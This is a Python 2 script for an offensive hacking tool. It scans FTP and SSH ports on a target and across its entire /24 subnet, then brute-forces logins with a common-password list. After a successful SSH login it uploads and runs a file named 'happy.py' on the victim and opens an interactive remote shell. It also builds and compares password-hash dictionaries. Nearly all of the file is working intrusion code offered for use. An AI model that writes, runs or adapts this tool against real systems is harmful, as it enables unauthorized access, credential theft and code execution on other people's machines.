import sys, ast, crypt, os
import ftplib
from urllib2 import Request, urlopen
from socket import socket, gethostbyname, AF_INET, SOCK_STREAM

try:
    import paramiko
except:
    print "You need to install the python module paramiko for ssh"
    print "run 'pip install paramiko'"
    print ""

# ANSI escape sequences
HEADER = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# Port listing
port_list = {21: "ftp", 22: "ssh"}

# Print string formatted with escape sequence
def print_f(string, seq):
    print seq + string + ENDC

def take_input():
    ports = raw_input("Enter Ports Separated By Space: ")
    ports = [int(p) for p in ports.split(" ")]
    url = raw_input("Enter IP Address/URL: ")
    portScan(url, ports)

# Get Banner for connection
def getBanner(soc):
    try:
        soc.send("Hello")
        rec = soc.recv(1024)
        return checkBanner(rec)
    except:
        return None

# Checks Banner against list of banners from file
def checkBanner(rec):
    fil = open("banners.txt", "r")
    for line in fil.readlines():
        if line.strip("\n") in rec:
            return line.strip("\n")
    return None

# This function checks for open ports
def portScan(url, limit):
    try:
        print_f("[*] Attempting To Scan {} Ports on {}...".format(limit,url), HEADER)

        url = url.replace("http://www.", "")
        url = url.split("/")[0]

        openports = 0

        rang = [] # Range of ports

        if type(limit) is int:
            rang = range(0, limit+1)
        elif type(limit) is str:
            rang = ast.literal_eval(limit)
        elif type(limit) is list:
            rang = limit

        for port in rang:

            sock = socket(AF_INET, SOCK_STREAM)

            sock.settimeout(0.5)
            test = sock.connect_ex((url,port))

            sys.stdout.write("\r[+] Scanning Port: {}".format(port))
            sys.stdout.flush()

            if test == 0:
                banner = getBanner(sock)
                print "\n[+] Port: {0} Banner: {1}".format(port, banner)
                crack_password(port, url)
                openports += 1

            sock.close()
        print_f("\n[*] Finished Scanning {0} Ports, {1} Open Port(s) Found".format(limit, openports), GREEN)
    except:
        print_f("\n[*] Error - No Port Scan available", FAIL)

def help():
    print "[*] '-h' or '--help' [For help]"
    print "Add '-s' in front to only scan a single IP"
    print "--genpass to generate password list"
    print "[*] <name of site> -- [To scan for open ports up to default]"
    print "[*] <name of site> <# of ports to check> -- [To scan for open ports up to specified]"
    
def ips(host):
    ips = []
    host = gethostbyname(host)
    bits = host.split(".")
    bitsjoin = bits[0] + "." + bits[1] + "." + bits[2] + "."
    for i in range (255):
        ip = bitsjoin + str(i)
        ips.append(ip)
    return ips


# Cracker Stuff

def crypthash(passwordfile, hashfile):
    count = 1
    pwdfile = open(passwordfile, "r")
    hashfile = open(hashfile, "w")
        
    for line in pwdfile:
        sys.stdout.write('\r%d passwords hashed' % count)
        count+=1
        cr = crypt.crypt(line, "j3")
        hashfile.write(line.strip("\n") + " " + cr + "\n")

    print "\nDone"
    pwdfile.close()
    hashfile.close()
    
def compare():
    with open("commonhash", "r") as pwdfile:
        print("Reading Password Hashes...")
        passwords = pwdfile.readlines()

    with open("HashedDict2", "r") as hashfile:
        print("\nReading Dictionary Hashes...")
        hashes = hashfile.readlines()
    
    pwdset = set(passwords)
    hashset = set(hashes)

    with open("result", "w") as result:
        print("\nStarting Comparison...\n")
        print("Password Matches:\n")
        
        for x in pwdset.intersection(hashset):
            result.write(x)
        
    print "Done Getting Passwords"

# gain access to machine
def crack_password(p, host):
    print_f("[*] Attempting to crack {} password on port {}".format(port_list[p], p), HEADER)

    f = open("commonpasswords", "r")

    if port_list[p] == "ftp":

        attempt = raw_input("attempt ftp (yes/no)?: ")

        if attempt == "yes" or attempt == "y":
            admin = raw_input("Username for ftp: ")

            for pasw in f.readlines():
                sys.stdout.write("\r[+] Trying password: {}".format(pasw.strip()))
                sys.stdout.flush()
                try:
                    ftp = ftplib.FTP(str(host))
                    x = ftp.login(admin, str(pasw.strip()))
                    if "230" in x:
                        print ""
                        print ""
                        print_f("GOT IN! Password Found: {}".format(pasw.strip()), GREEN)
                        print ""
                        ftp.close()
                        break
                except:
                    pass

    elif port_list[p] == "ssh":

        attempt = raw_input("attempt ssh crack (yes/no)?: ")

        if attempt == "yes" or attempt == "y":
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.WarningPolicy())
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            admin = raw_input("Username for ssh: ")

            for pasw in f.readlines():
                sys.stdout.write("\r[+] Trying password: {}".format(pasw.strip()))
                sys.stdout.flush()
                try:

                    client.connect(host, port=p, username=admin, password=pasw.strip())
                    sftp = client.open_sftp()

                    src = os.getcwd() + "/happy.py"
                    sftp.put(src, '/home/{}/happy.py'.format(admin))
                    client.exec_command("python /home/{}/happy.py".format(admin))

                    print ""
                    print "Password Found: {}".format(pasw.strip())
                    print ""

                    print "Shell - Enter shell command type exit when done"

                    command = ""

                    while command != "exit":
                        command = raw_input(">> ")
                        stdin, stdout, stderr = client.exec_command(command)
                        print stdout.read()
                    break
                except:
                    pass

            client.close()
    f.close()

def main():

    if not os.path.exists("result"):
        print_f("[*] Generating password dictionary...", HEADER)
        crypthash("commonpasswords", "commonhash")
        crypthash("passwords2", "HashedDict2")
        compare()

    if len(sys.argv) < 2:
        take_input()

    elif sys.argv[1] == "--genpass":
        crypthash("commonpasswords", "commonhash")
        crypthash("passwords2", "HashedDict2")
        compare()

    elif sys.argv[1] == '-h' or sys.argv[1] == '--help':
        help()

    elif len(sys.argv) == 3 and sys.argv[1] == '-s':
        portScan(sys.argv[2], [21,22])

    elif len(sys.argv) == 4 and sys.argv[1] == '-s':
        try:
            portScan(sys.argv[2], int(sys.argv[3]))
        except:
            portScan(sys.argv[2], sys.argv[3]) 

    elif len(sys.argv) == 2:
        portScan(sys.argv[1], [21,22])

        p = ips(sys.argv[1])

        for i in range (1,len(p)):
            portScan(p[i], [21,22])

    elif len(sys.argv) > 2:
        try:
            portScan(sys.argv[1], int(sys.argv[2]))

            p = ips(sys.argv[1])
            for i in range (1,len(p)):
                portScan(p[i], int(sys.argv[2]))
        except:
            portScan(sys.argv[1], sys.argv[2])

            p = ips(sys.argv[1])
            for i in range (1,len(p)):
                portScan(p[i], sys.argv[2])

    else:
        print_f("[-] Error - Check Your Command", FAIL)
        help()

    print "" # leave some space

if __name__ == "__main__":
    main()